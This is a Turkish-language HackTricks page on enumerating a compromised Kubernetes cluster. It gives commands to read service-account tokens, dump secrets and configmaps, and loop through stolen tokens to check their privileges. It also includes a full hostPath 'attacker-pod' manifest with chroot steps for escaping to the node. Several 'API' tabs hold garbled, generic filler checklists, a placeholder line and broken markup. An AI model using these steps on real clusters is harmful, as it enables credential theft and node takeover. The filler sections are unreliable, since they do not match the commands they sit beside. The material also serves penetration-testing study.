# Kubernetes Numaralandırma

{% hint style="success" %}
AWS Hacking'i öğrenin ve uygulayın:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* Hacking püf noktalarını paylaşarak PR'ler göndererek [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
{% endhint %}

## Kubernetes Token'ları

Eğer bir makineye erişimi ele geçirdiyseniz, kullanıcı Kubernetes platformuna erişime sahip olabilir. Token genellikle **`KUBECONFIG`** çevresel değişkeni tarafından işaret edilen bir dosyada veya **`~/.kube`** içinde bulunur.

Bu klasörde genellikle **API sunucusuna bağlanmak için tokenlar ve yapılandırmalar** içeren yapılandırma dosyaları bulabilirsiniz. Bu klasörde ayrıca daha önce alınmış bilgileri içeren bir önbellek klasörü bulunabilir.

Bir Kubernetes ortamındaki bir pod'u ele geçirdiyseniz, mevcut K8 ortamı hakkında tokenlar ve bilgiler bulabileceğiniz diğer yerler vardır:

### Servis Hesabı Token'ları

Devam etmeden önce, Kubernetes'te bir servis nedir bilmiyorsanız, **bu bağlantıyı takip edin ve en azından Kubernetes mimarisi hakkındaki bilgileri okuyun.**

Kubernetes belgelerinden alınan:

_“Bir pod oluşturduğunuzda, bir servis hesabı belirtmezseniz, aynı ad alanındaki_ varsayılan _servis hesabı otomatik olarak atanır.”_

**ServiceAccount**, Kubernetes tarafından yönetilen ve bir pod'da çalışan işlemlere kimlik sağlamak için kullanılan bir nesnedir.\
Her servis hesabının buna ilişkin bir sırrı vardır ve bu sır, bir taşıyıcı belirteci içerir. Bu, iki taraf arasında iddiaları güvenli bir şekilde temsil etmek için bir yöntem olan JSON Web Token (JWT)’dir.

Genellikle **birinin** şu dizinlerinden biri:

* `/run/secrets/kubernetes.io/serviceaccount`
* `/var/run/secrets/kubernetes.io/serviceaccount`
* `/secrets/kubernetes.io/serviceaccount`

şu dosyaları içerir:

* **ca.crt**: Kubernetes iletişimlerini kontrol etmek için ca sertifikasıdır
* **namespace**: Geçerli ad alanını gösterir
* **token**: Geçerli pod'un **servis belirteci**ni içerir.

Artık belirtece sahip olduğunuza göre, API sunucusunu **`KUBECONFIG`** çevresel değişkeninde bulabilirsiniz. Daha fazla bilgi için `(env | set) | grep -i "kuber|kube`**`"`** komutunu çalıştırın.

Servis hesabı belirteci, **sa.key** dosyasında bulunan anahtar tarafından imzalanmakta ve **sa.pub** tarafından doğrulanmaktadır.

**Kubernetes**'te varsayılan konum:

* /etc/kubernetes/pki

**Minikube**'de varsayılan konum:

* /var/lib/localkube/certs

### Sıcak Podlar

_**Sıcak podlar**_, ayrıcalıklı bir servis hesabı belirtecini içeren podlardır. Ayrıcalıklı bir servis hesabı belirtisi, gizli görevleri yapma iznine sahip bir belirteçtir, örneğin sırları listeleme, pod'lar oluşturma vb.

## RBAC

**RBAC** nedir bilmiyorsanız, **bu bölümü okuyun.**

## Numaralandırma Hile Kağıdı

Bir K8s ortamını numaralandırmak için şunlara ihtiyacınız vardır:

* Bir **geçerli kimlik doğrulama belirteci**. Önceki bölümde bir kullanıcı belirteci ve bir servis hesabı belirteci aramak için nerede arayacağımızı gördük.
* Kubernetes API'sinin **adresi (**_**https://host:port**_**)**. Bu genellikle çevresel değişkenlerde ve/veya kube yapılandırma dosyasında bulunabilir.
* **İsteğe bağlı**: **API sunucusunu doğrulamak için ca.crt**. Bu, belirtecin bulunduğu yerlerde bulunabilir. Bu, API sunucusu sertifikasını doğrulamak için kullanışlıdır, ancak `kubectl` ile `--insecure-skip-tls-verify` veya `curl` ile `-k` kullanarak bunu gerekli olmayacaktır.

Bu ayrıntılarla Kubernetes'i **numaralandırabilirsiniz**. API'nin bir nedenle **İnternet üzerinden erişilebilir** olduğu durumlarda, bu bilgileri indirip platformu kendi makinenizden numaralandırabilirsiniz.

Ancak genellikle **API sunucusu iç ağda** bulunur, bu nedenle ona erişmek için ele geçirilmiş makineden kendi makinenize erişmek için bir tünel oluşturmanız gerekecektir veya [**kubectl**](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux) ikilisini yükleyebilir veya API sunucusuna doğrudan HTTP istekleri yapmak için `curl/wget/herhangi bir şey` kullanabilirsiniz.

### `list` ve `get` fiilleri arasındaki farklar

**`get`** izinleriyle belirli varlıkların bilgilerine erişebilirsiniz (_`kubectl`'deki `describe` seçeneği_).
```
GET /apis/apps/v1/namespaces/{namespace}/deployments/{name}
```
Eğer **`list`** izniniz varsa, bir varlık türünü listelemek için API isteklerini yürütmenize izin verilir (_`kubectl`_ içindeki _`get`_ seçeneği):
```bash
#In a namespace
GET /apis/apps/v1/namespaces/{namespace}/deployments
#In all namespaces
GET /apis/apps/v1/deployments
```
Eğer **`watch`** izniniz varsa, varlıkları izlemek için API isteklerini yürütmenize izin verilir:
```
GET /apis/apps/v1/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments/{name}  [DEPRECATED]
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments  [DEPRECATED]
GET /apis/apps/v1/watch/deployments  [DEPRECATED]
```
They open a streaming connection that returns you the full manifest of a Deployment whenever it changes (or when a new one is created).

{% hint style="danger" %}
The following `kubectl` commands indicates just how to list the objects. If you want to access the data you need to use `describe` instead of `get`
{% endhint %}

### Using curl

From inside a pod you can use several env variables:
```bash
export APISERVER=${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}
export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
export CACERT=${SERVICEACCOUNT}/ca.crt
alias kurl="curl --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\""
# if kurl is still got cert Error, using -k option to solve this.
```
{% hint style="warning" %}
Varsayılan olarak, pod, **`kubernetes.default.svc`** alan adındaki **kube-api sunucusuna erişebilir** ve **`/etc/resolv.config`** dosyasında kube ağını görebilirsiniz (aynı aralığın ".1"si kube-api uç noktasıdır).
{% endhint %}

### kubectl Kullanımı

Token ve API sunucusunun adresine sahip olarak, burada belirtildiği gibi kubectl veya curl kullanarak erişebilirsiniz:

Varsayılan olarak, APISERVER `https://` şemasıyla iletişim kurmaktadır.
```bash
alias k='kubectl --token=$TOKEN --server=https://$APISERVER --insecure-skip-tls-verify=true'
```
> Eğer URL'de `https://` yoksa, Kötü İstek gibi bir Hata Alabilirsiniz.

[**Resmi kubectl hile yaprağına buradan ulaşabilirsiniz**](https://kubernetes.io/docs/reference/kubectl/cheatsheet/). Aşağıdaki bölümlerin amacı, elde ettiğiniz yeni K8s'i sıralı bir şekilde sıralamak ve anlamaktır.

`kubectl`'ün gönderdiği HTTP isteğini bulmak için `-v=8` parametresini kullanabilirsiniz.

#### MitM kubectl - kubectl'i Proxy Olarak Kullanma
```bash
# Launch burp
# Set proxy
export HTTP_PROXY=http://localhost:8080
export HTTPS_PROXY=http://localhost:8080
# Launch kubectl
kubectl get namespace --insecure-skip-tls-verify=true
```
### Mevcut Yapılandırma

{% tabs %}
{% tab title="Kubectl" %}
```bash
kubectl config get-users
kubectl config get-contexts
kubectl config get-clusters
kubectl config current-context

# Change namespace
kubectl config set-context --current --namespace=<namespace>
```
{% endtab %}
{% endtabs %}

Eğer bazı kullanıcı kimlik bilgilerini çalmayı başardıysanız, bunları **yerel olarak yapılandırabilirsiniz** örneğin:
```bash
kubectl config set-credentials USER_NAME \
--auth-provider=oidc \
--auth-provider-arg=idp-issuer-url=( issuer url ) \
--auth-provider-arg=client-id=( your client id ) \
--auth-provider-arg=client-secret=( your client secret ) \
--auth-provider-arg=refresh-token=( your refresh token ) \
--auth-provider-arg=idp-certificate-authority=( path to your ca certificate ) \
--auth-provider-arg=id-token=( your id_token )
```
### Desteklenen Kaynakları Al

Bu bilgi ile listeleyebileceğiniz tüm hizmetleri bileceksiniz

{% tabs %}
{% tab title="kubectl" %}
```bash
k api-resources --namespaced=true #Resources specific to a namespace
k api-resources --namespaced=false #Resources NOT specific to a namespace
```
### Mevcut Yetkileri Al

{% tabs %}
{% tab title="kubectl" %}
```bash
k auth can-i --list #Get privileges in general
k auth can-i --list -n custnamespace #Get privileves in custnamespace

# Get service account permissions
k auth can-i --list --as=system:serviceaccount:<namespace>:<sa_name> -n <namespace>
```
{% endtab %}

{% tab title="API" %} 

### API Enumerasyonu

API'leri belirlemek ve sorgulamak için aşağıdaki adımları izleyin:

1. **API Sunucularını Tanımlama**: API sunucularını belirlemek için DNS sorguları, port taramaları ve web uygulaması taramaları yapın.

2. **API Sürümlerini Belirleme**: API sürümlerini belirlemek için belgelere, sürüm numaralarına ve değişiklik günlüklerine bakın.

3. **API Yönlendirmelerini İnceleme**: API yönlendirmelerini inceleyerek gizli veya yetkisiz erişim noktalarını keşfedin.

4. **API Sorgularını İnceleme**: API sorgularını inceleyerek yetkisiz veri erişimini tespit edin.

5. **API Yetkilendirmesini İnceleme**: API yetkilendirmesini inceleyerek yetkisiz erişim yöntemlerini belirleyin.

6. **API Hatalarını İnceleme**: API hatalarını inceleyerek güvenlik açıklarını tespit edin ve kötü niyetli saldırılara karşı önlem alın.

{% endtab %}
```bash
kurl -i -s -k -X $'POST' \
-H $'Content-Type: application/json' \
--data-binary $'{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"metadata\":{\"creationTimestamp\":null},\"spec\":{\"namespace\":\"default\"},\"status\":{\"resourceRules\":null,\"nonResourceRules\":null,\"incomplete\":false}}\x0a' \
"https://$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews"
```
{% endtab %}
{% endtabs %}

Ayrıcalıklarınızı kontrol etmenin başka bir yolu, [**https://github.com/corneliusweig/rakkess**](https://github.com/corneliusweig/rakkess)**** aracını kullanmaktır.

**Kubernetes RBAC** hakkında daha fazla bilgi edinebilirsiniz:

{% content-ref url="kubernetes-role-based-access-control-rbac.md" %}
[kubernetes-role-based-access-control-rbac.md](kubernetes-role-based-access-control-rbac.md)
{% endcontent-ref %}

**Hangi ayrıcalıklara sahip olduğunuzu** bildikten sonra, aşağıdaki sayfayı kontrol ederek bu ayrıcalıkları **köprü ayrıcalıklarına yükseltip yükseltemeyeceğinizi** anlayabilirsiniz:

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### Diğer rolleri alın

{% tabs %}
{% tab title="kubectl" %}
```bash
k get roles
k get clusterroles
```
{% endtab %}

{% tab title="API" %} 

### API Enumerasyonu

API'leri belirlemek ve sorgulamak için aşağıdaki adımları izleyin:

1. **API Sunucu IP Adreslerini Belirleme**: API sunucularının IP adreslerini belirleyin.

2. **API Endpoint'leri Tarayın**: API endpoint'lerini tarayarak mevcut olanları belirleyin.

3. **API Metotlarını Belirleme**: API endpoint'lerine hangi metotların (GET, POST, PUT, DELETE vb.) izin verildiğini belirleyin.

4. **API Yetkilendirme ve Kimlik Doğrulama Mekanizmalarını Belirleme**: API'lerin yetkilendirme ve kimlik doğrulama mekanizmalarını belirleyin.

5. **API Sürümlerini Belirleme**: API'lerin desteklediği sürümleri belirleyin.

6. **API Dokümantasyonunu İnceleme**: API'lerin dokümantasyonunu inceleyerek daha fazla bilgi edinin.

7. **API Güvenlik Zafiyetlerini Arama**: API'lerde yaygın olarak bulunan güvenlik zafiyetlerini arayın.

{% endtab %}
```bash
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/roles?limit=500"
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/clusterroles?limit=500"
```
{% endtab %}
{% endtabs %}

### Namespace'ları Al

Kubernetes, aynı fiziksel küme tarafından desteklenen **çoklu sanal kümeleri** destekler. Bu sanal kümeler **namespace** olarak adlandırılır.
```bash
k get namespaces
```
{% endtab %}

{% tab title="API" %} 

## API

API'leri belirlemek ve sorgulamak için aşağıdaki adımları izleyin:

1. API sunucularını belirlemek için hedef alan adını kullanın.
2. `kubectl get svc` komutunu kullanarak hizmetleri listeleyin.
3. `kubectl describe svc <service-name>` komutunu kullanarak hizmet hakkında ayrıntılı bilgi alın.
4. `kubectl get pods --all-namespaces` komutunu kullanarak tüm pod'ları listeleyin.
5. `kubectl describe pod <pod-name> -n <namespace>` komutunu kullanarak pod hakkında ayrıntılı bilgi alın.
6. API'lerin kullanılabilirliğini ve yetkilendirme düzeyini kontrol edin.
7. API'lerin güvenlik ayarlarını inceleyin ve gerektiğinde güçlendirin.

Bu adımlar, Kubernetes ortamında API'leri belirlemek ve güvenlik açıklarını tespit etmek için kullanışlı olacaktır.

{% endtab %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/
```
### Sırları Al

{% tabs %}
{% tab title="kubectl" %}
```
k get secrets -o yaml
k get secrets -o yaml -n custnamespace
```
{% endtab %}

{% tab title="API" %} 

## API

API'leri belirlemek ve sorgulamak için aşağıdaki adımları izleyin:

1. API sunucularını belirlemek için hedef alan IP aralığını taramak.
2. API sunucularına yönelik hedef tarama sonuçlarını analiz etmek.
3. API sunucularına karşı açık olan portları belirlemek.
4. API sunucularına karşı kullanılan protokolleri belirlemek.
5. API sunucularına karşı kullanılan HTTP başlıklarını incelemek.
6. API sunucularına karşı kullanılan HTTP metotlarını incelemek.
7. API sunucularına karşı kullanılan HTTP yanıt kodlarını incelemek.
8. API sunucularına karşı yetkisiz erişim noktalarını belirlemek.
9. API sunucularına karşı yetkisiz erişim noktalarını sorgulamak.
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/secrets/

kurl -v https://$APISERVER/api/v1/namespaces/custnamespace/secrets/
```
{% endtab %}
{% endtabs %}

Eğer sırları okuyabiliyorsanız, her bir belirteçle ilgili ayrıcalıkları almak için aşağıdaki satırları kullanabilirsiniz:
```bash
for token in `k describe secrets -n kube-system | grep "token:" | cut -d " " -f 7`; do echo $token; k --token $token auth can-i --list; echo; done
```
### Servis Hesaplarını Al

Bu sayfanın başında tartışıldığı gibi **bir pod çalıştırıldığında genellikle ona bir servis hesabı atanır**. Bu nedenle, servis hesaplarını, izinlerini ve nerede çalıştıklarını listelemek bir kullanıcının ayrıcalıklarını yükseltmesine olanak tanıyabilir.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get serviceaccounts
```
{% endtab %}

{% tab title="API" %} 

## API

API'leri belirlemek ve sorgulamak için aşağıdaki adımları izleyebilirsiniz:

1. API sunucularını belirlemek için Kubernetes içinde çalışan pod'ları taramak.
2. API sunucularına erişmek için hedef pod'larını hedefleyin.
3. API'lerin kullanılabilirliğini ve yetkilendirme mekanizmalarını inceleyin.
4. API'lerin güvenlik zafiyetlerini araştırın ve sızma testleri yapın.

{% endtab %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/{namespace}/serviceaccounts
```
### Dağıtımları Al

Dağıtımlar çalıştırılması gereken **bileşenleri** belirtir.

{% tabs %}
{% tab title="kubectl" %}
```
.k get deployments
k get deployments -n custnamespace
```
{% endtab %}

{% tab title="API" %} 

### API Enumerasyonu

API'ları belirlemek ve sorgulamak için aşağıdaki adımları izleyin:

1. **API Endpoint'leri Tarama**: API endpoint'lerini belirlemek için otomatik araçlar kullanın veya manuel olarak tarama yapın.
2. **HTTP Metotlarını Sorgulama**: API endpoint'lerine GET, POST, PUT, DELETE gibi HTTP metotlarıyla sorgulamalar yapın.
3. **Parametrelerde Fuzzing**: API endpoint'lerine geçirilen parametrelerde fuzzing yaparak güvenlik açıkları arayın.
4. **Hata Mesajları İnceleme**: API tarafından döndürülen hata mesajlarını inceleyerek bilgi toplayın.
5. **Header Bilgilerini Kontrol Etme**: API isteklerinde gönderilen header bilgilerini kontrol ederek güvenlik zafiyetleri arayın.

Bu adımları takip ederek API'ları etkili bir şekilde enumerate edebilir ve güvenlik açıklarını tespit edebilirsiniz.

{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/deployments/
```
### Podları Al

Podlar gerçek **konteynerlerdir** ve **çalışacaklardır**.
```
k get pods
k get pods -n custnamespace
```
{% endtab %}

{% tab title="API" %} 

### API Enumerasyonu

API'ları belirlemek ve sorgulamak için aşağıdaki adımları izleyin:

1. **API Endpoint'leri Tarama**: API endpoint'lerini belirlemek için otomatik araçlar kullanın veya manuel olarak tarama yapın.
2. **API Metotları ve Parametreleri**: API metotlarını ve destekledikleri parametreleri belirleyin.
3. **Yetkilendirme ve Kimlik Doğrulama**: API'ye erişmek için gereken yetkilendirme ve kimlik doğrulama mekanizmalarını belirleyin.
4. **API Sürümleri**: Desteklenen API sürümlerini belirleyin ve güvenlik açıklarını kontrol edin.
5. **Hata Mesajları**: API'den dönen hata mesajlarını inceleyerek güvenlik açıklarını tespit edin.

Bu adımları takip ederek API'ları etkili bir şekilde enumere edebilir ve güvenlik açıklarını tespit edebilirsiniz.

{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/pods/
```
### Servisleri Al

Kubernetes **servisleri**, bir hizmeti belirli bir bağlantı noktasında ve IP adresinde **sunmak için kullanılır** (bu, aslında hizmeti sunan pod'lara yük dengeleyici olarak hareket edecektir). Bu, saldırmaya çalışabileceğiniz diğer servisleri bulabileceğiniz yeri bilmek açısından ilginçtir.
```
k get services
k get services -n custnamespace
```
{% endtab %}

{% tab title="API" %}API{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/services/
```
### Düğümleri Al

Küme içinde yapılandırılmış olan tüm **düğümleri alın**.

{% tabs %}
{% tab title="kubectl" %}
```
k get nodes
```
{% endtab %}

{% tab title="API" %} 

### API Enumerasyonu

API'leri belirlemek ve sorgulamak için aşağıdaki adımları izleyebilirsiniz:

1. **API Endpoint'leri Tarama**: API endpoint'lerini belirlemek için otomatik araçlar kullanın veya manuel olarak tarama yapın.
   
2. **HTTP Metotlarını Kullanma**: Belirlenen endpoint'leri HTTP GET, POST, PUT, DELETE gibi farklı metotlarla sorgulayın.
   
3. **Parametrelerle Oynama**: Endpoint'lere farklı parametreler ekleyerek davranışlarını test edin.
   
4. **Hata Kodları İnceleme**: API yanıtlarında dönen hata kodlarını inceleyerek zayıf noktaları belirleyin.
   
5. **Gizli Endpoint'leri Keşfetme**: Gizli veya yetkisiz erişime açık olabilecek endpoint'leri tespit edin.

Bu adımları takip ederek API'lerde güvenlik açıklarını tespit edebilir ve önlem alabilirsiniz.

{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/nodes/
```
### DaemonSets'i Al

**DaemonSets**, kümenin tüm düğümlerinde (veya seçilen düğümlerde) **belirli bir kapsülün çalıştığından emin olmayı sağlar**. DaemonSet'i sildiğinizde, onun tarafından yönetilen kapsüller de kaldırılacaktır.
```
k get daemonsets
```
{% endtab %}

{% tab title="API" %} 

### API Enumerasyonu

API'leri belirlemek ve sorgulamak için aşağıdaki adımları izleyin:

1. **API Sunucu IP Adreslerini Belirleme**: Kubernetes kümesindeki API sunucularının IP adreslerini belirleyin.

2. **API Sürümlerini Belirleme**: API sunucularının desteklediği sürümleri belirleyin.

3. **API Yönlendirmelerini İnceleme**: API sunucularının yönlendirmelerini inceleyerek farklı API'lerin nerede barındırıldığını belirleyin.

4. **API Erişim Denetimlerini Kontrol Etme**: API'lerin erişim denetimlerini kontrol ederek yetkisiz erişimleri tespit edin.

5. **API Kimlik Doğrulama Mekanizmalarını İnceleme**: API'lerin kullandığı kimlik doğrulama mekanizmalarını inceleyerek zayıf noktaları belirleyin.

6. **API İsteklerini İzleme ve Analiz Etme**: API isteklerini izleyerek ve analiz ederek güvenlik açıklarını tespit edin.

{% endtab %}
```bash
kurl -v https://$APISERVER/apis/extensions/v1beta1/namespaces/default/daemonsets
```
### Cronjob'u Al

Cron işleri, crontab benzeri bir sözdizimi kullanarak belirli bir eylemi gerçekleştirecek bir kapsülün başlatılmasını zamanlamayı sağlar.
```
k get cronjobs
```
{% endtab %}

{% tab title="API" %} 

### API Enumerasyonu

API'ları belirlemek ve sorgulamak için aşağıdaki adımları izleyebilirsiniz:

1. **API Endpoint'leri Tarama**: API endpoint'lerini belirlemek için otomatik araçlar kullanın veya manuel olarak tarama yapın.
2. **API Metotları ve Parametreleri İnceleme**: API metotlarını ve parametrelerini anlamak için belgeleri inceleyin veya deneme yanılma yöntemini kullanın.
3. **API Yetkilendirme ve Kimlik Doğrulama Denemeleri**: API'ye yetkisiz erişim sağlamak için yetkilendirme ve kimlik doğrulama zayıflıklarını araştırın.
4. **API Rate Limiting ve Throttling Denemeleri**: API'yi aşırı yükleme veya sınırlama zayıflıklarını tespit etmek için rate limiting ve throttling denemeleri yapın.
5. **API Hata Mesajları İnceleme**: API hata mesajlarını inceleyerek bilgi sızdırmaya yönelik zayıflıkları tespit edin.

Bu adımları takip ederek API'ları etkili bir şekilde enumerate edebilir ve güvenlik açıklarını tespit edebilirsiniz.

{% endtab %}
```bash
kurl -v https://$APISERVER/apis/batch/v1beta1/namespaces/<namespace>/cronjobs
```
{% endtab %}
{% endtabs %}

### ConfigMap'ı Al

configMap her zaman Kubernetes'te çalışan uygulamalara sağlanan birçok bilgi ve yapılandırma dosyasını içerir. Genellikle, diğer iç/dış servislere bağlanmak ve doğrulamak için kullanılan birçok şifre, gizli bilgi ve belirteç bulabilirsiniz.
```
k get configmaps # -n namespace
```
{% endtab %}

{% tab title="API" %} 

API sekmesi içeriği buraya gelecek.

{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/${NAMESPACE}/configmaps
```
### "Tümünü" Al

{% tabs %}
{% tab title="kubectl" %}
```
k get all
```
### **Pod Tüketimlerini Alın**

{% tabs %}
{% tab title="kubectl" %}
```
k top pod --all-namespaces
```
### Pod'dan Kaçma

Eğer yeni pod'lar oluşturabiliyorsanız, onlardan düğüme kaçabilirsiniz. Bunu yapabilmek için bir yaml dosyası kullanarak yeni bir pod oluşturmanız, oluşturulan pod'a geçmeniz ve ardından düğümün sistemine chroot yapmanız gerekmektedir. Var olan pod'ları yaml dosyası için referans olarak kullanabilirsiniz çünkü mevcut görüntüleri ve yolları gösterirler.
```bash
kubectl get pod <name> [-n <namespace>] -o yaml
```
> Eğer belirli bir düğümde pod oluşturmanız gerekiyorsa, düğümdeki etiketleri almak için aşağıdaki komutu kullanabilirsiniz
>
> `k get nodes --show-labels`
>
> Genellikle, kubernetes.io/hostname ve node-role.kubernetes.io/master etiketleri seçim için iyidir.
>
> [referans]: https://kubernetes.io/docs/concepts/scheduling-eviction/assign-pod-node/

Daha sonra attack.yaml dosyanızı oluşturun
```yaml
apiVersion: v1
kind: Pod
metadata:
labels:
run: attacker-pod
name: attacker-pod
namespace: default
spec:
volumes:
- name: host-fs
hostPath:
path: /
containers:
- image: ubuntu
imagePullPolicy: Always
name: attacker-pod
command: ["/bin/sh", "-c", "sleep infinity"]
volumeMounts:
- name: host-fs
mountPath: /root
restartPolicy: Never
# nodeName and nodeSelector enable one of them when you need to create pod on the specific node
#nodeName: master
#nodeSelector:
#  kubernetes.io/hostname: master
# or using
#  node-role.kubernetes.io/master: ""
```
[orijinal yaml kaynağı](https://gist.github.com/abhisek/1909452a8ab9b8383a2e94f95ab0ccba)

Ardından pod'u oluşturun.
```bash
kubectl apply -f attacker.yaml [-n <namespace>]
```
Şimdi oluşturulan pod'a aşağıdaki gibi geçebilirsiniz:
```bash
kubectl exec -it attacker-pod [-n <namespace>] -- sh # attacker-pod is the name defined in the yaml file
```
Ve son olarak düğümün sistemine chroot yapın.
```bash
chroot /root /bin/bash
```
Bilgiler: [Kubernetes Namespace Breakout using Insecure Host Path Volume — Part 1](https://blog.appsecco.com/kubernetes-namespace-breakout-using-insecure-host-path-volume-part-1-b382f2a6e216) [Attacking and Defending Kubernetes: Bust-A-Kube – Episode 1](https://www.inguardians.com/attacking-and-defending-kubernetes-bust-a-kube-episode-1/)

## Referanslar

{% embed url="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3" %}

{% hint style="success" %}
AWS Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Eğitimi AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Eğitimi GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarını paylaşarak PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
{% endhint %}
